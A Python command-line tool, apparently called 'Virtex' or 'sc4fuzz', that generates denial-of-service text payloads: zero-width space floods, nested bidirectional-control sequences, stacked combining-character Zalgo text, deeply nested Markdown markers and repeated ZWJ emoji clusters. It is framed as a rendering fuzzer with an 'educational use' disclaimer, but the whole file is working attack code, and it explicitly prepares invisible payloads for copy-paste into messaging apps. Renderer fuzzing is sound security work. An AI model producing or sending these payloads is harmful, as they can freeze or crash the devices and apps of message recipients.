#!/usr/bin/env python3

import argparse
import sys

"""
Text Rendering Stress Tester (A.K.A Virtex)
-------------------------------------------------------
A security research tool designed to generate complex Unicode text payloads.
These payloads are used to fuzz and stress-test text rendering engines 
in messaging applications and browsers against Denial of Service (DoS) 
vulnerabilities caused by complex recursive, Bidi, and ZWJ sequences.

DISCLAIMER: 
For Educational and Testing Purposes Only. 
The author is not responsible for any misuse of this tool.
"""

ZWSP = u'\u200b'        
RLM = u'\u200f'         
LRM = u'\u200e'         
RLE = u'\u202b'         
PDF = u'\u202c'         
NBSP = u'\u00a0'        
COMBINING_DIACRITIC = u'\u0308'  
COMPLEX_EMOJI = u'👨\u200d👩\u200d👧\u200d👦' 


def generate_zwsp(count):
    """Generates a simple ZWSP bomb."""
    print(f"[*] Generating ZWSP Bomb with {count} characters...")
    return ZWSP * count

def generate_bidi_complex(count):
    """
    Generates a complex Bidirectional (Bidi) bomb using RLM, LRM, RLE, and PDF.
    This pattern forces the rendering engine to repeatedly switch text direction
    and handle nested/stacked direction embeddings.
    """
    print(f"[*] Generating Complex Bidi Bomb with {count} sequences...")
    pattern = RLE + "A" + LRM + "B" + PDF
    return pattern * count

def generate_zalgo(count, depth):
    """
    Generates a 'Zalgo' text bomb using combining characters.
    """
    print(f"[*] Generating Zalgo Bomb: {count} chars, {depth} stack depth...")
    stack = COMBINING_DIACRITIC * depth
    base_char = "Z"
    return (base_char + stack) * count

def generate_recursive_nested(depth, format_char="*"):
    """
    Generates a deeply nested recursive formatting payload (e.g., Markdown/BBCode).
    This heavily stresses the parser by forcing deep recursion calculation.
    """
    print(f"[*] Generating Nested Recursive Bomb (depth {depth}) using '{format_char*2}'...")
    
    marker_open = format_char * 2 
    marker_close = format_char * 2
    
    payload = " RECURSIVE TEST "
    
    for _ in range(depth):
        payload = marker_open + payload + marker_close
        
    return payload

def generate_emoji_cluster(count, emoji=COMPLEX_EMOJI):
    """
    Generates an Emoji Cluster stress test payload.
    Uses a complex ZWJ sequence (e.g., family emoji cluster) repeated 'count' times 
    to stress rendering engine merging and layout computation.
    """
    total_chars = len(emoji) * count 
    print(f"[*] Generating Emoji Cluster Stress Test with {count} sequences.")
    print(f"    (Estimated total Unicode characters: {total_chars})")
    
    payload = emoji * count
    return payload


# ---Main ---

def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    BANNER = r"""
    
  /$$$$$$        /$$   /$$       /$$$$$$$$
 /$$__  $$      | $$  | $$      | $$_____/
| $$  \__/      | $$  | $$      | $$      
|  $$$$$$       | $$$$$$$$      | $$$$$   
 \____  $$      |_____  $$      | $$__/   
 /$$  \ $$            | $$      | $$      
|  $$$$$$/            | $$      | $$      
 \______/             |__/      |__/       
     
                        sc4fuzz - Unicode Rendering Fuzzer
__________________________________________________________
"""

    parser.add_argument(
        "-t", "--type",
        required=True,
        choices=['zwsp', 'bidi', 'zalgo', 'recursive', 'emoji'],
        help="""Type of payload to generate:
- zwsp: Zero-Width Space bomb
- bidi: Bidirectional (COMPLEX) bomb
- zalgo: Combining characters stack bomb
- recursive: Recursive (NESTED) formatting bomb
- emoji: Complex Zero-Width Joiner (ZWJ) cluster bomb
"""
    )
    
    parser.add_argument(
        "-c", "--count",
        type=int,
        default=10000,
        help="Number of base characters or repetitions (default: 10000)"
    )
    
    parser.add_argument(
        "-d", "--depth",
        type=int,
        default=20,
        help="Stack depth (zalgo) or recursion depth (recursive) (default: 20)"
    )
    
    parser.add_argument(
        "-f", "--format",
        default="*",
        help="Formatting character for 'recursive' payload (default: *)"
    )
    
    parser.add_argument(
        "-o", "--output",
        default="fuzz_payload.txt",
        help="Output filename to save the payload (default: fuzz_payload.txt)"
    )

    parser.add_argument(
        "--show",
        action="store_true", 
        help="Display payload in console (preview) without saving to file."
    )
    
    if len(sys.argv) == 1:
        print(BANNER)
        parser.print_help()
        sys.exit(0)
        
    args = parser.parse_args()
    
    MAX_COUNT = 1000000
    MAX_DEPTH = 500
    
    if args.count > MAX_COUNT:
        print(f"[!] ERROR: Count ({args.count}) exceeds safe limit ({MAX_COUNT}).", file=sys.stderr)
        sys.exit(1)
        
    if args.depth > MAX_DEPTH and args.type in ['zalgo', 'recursive']:
        print(f"[!] ERROR: Depth ({args.depth}) exceeds safe limit ({MAX_DEPTH}).", file=sys.stderr)
        sys.exit(1)

    payload = ""
    
    if args.type == 'zwsp':
        payload = generate_zwsp(args.count)
    elif args.type == 'bidi':
        payload = generate_bidi_complex(args.count)
    elif args.type == 'zalgo':
        payload = generate_zalgo(args.count, args.depth)
    elif args.type == 'recursive':
        payload = generate_recursive_nested(args.depth, format_char=args.format)
    elif args.type == 'emoji': 
        payload = generate_emoji_cluster(args.count)
        
    if not payload:
        print("[!] Invalid payload type.", file=sys.stderr)
        sys.exit(1)
        
    format_info = f", Format: {args.format}" if args.type == 'recursive' else ""
    depth_info = f", Depth: {args.depth}" if args.type in ['zalgo', 'recursive'] else ""
    
    MARKER_START = f"=== START PAYLOAD (Type: {args.type}, Count: {args.count}{depth_info}{format_info}) ===\n"
    MARKER_END = "\n=== END PAYLOAD ==="
    final_payload = MARKER_START + payload + MARKER_END

    if args.show:
        print("\n--- PAYLOAD PREVIEW (Console Output) ---")
        if len(final_payload) > 400:
            print(final_payload[:200])
            print(f"\n... [Truncated: {len(final_payload) - 400} characters omitted] ...\n")
            print(final_payload[-200:])
        else:
            print(final_payload)
        print("------------------------------------------")

    if args.type in ['zwsp', 'bidi', 'emoji']: 
        print("\n[!!!] WARNING: Generated payload is invisible or hard to read. Use output file or preview for copy-paste.")

    if not args.show:
        try:
            with open(args.output, "w", encoding="utf-8") as f:
                f.write(final_payload)
            
            print(f"\n[+] Payload successfully saved to: {args.output}")
            print(f"    Total character length: {len(final_payload)}")
            
        except Exception as e:
            print(f"[!] Failed to save file: {e}", file=sys.stderr)

if __name__ == "__main__":
    main()
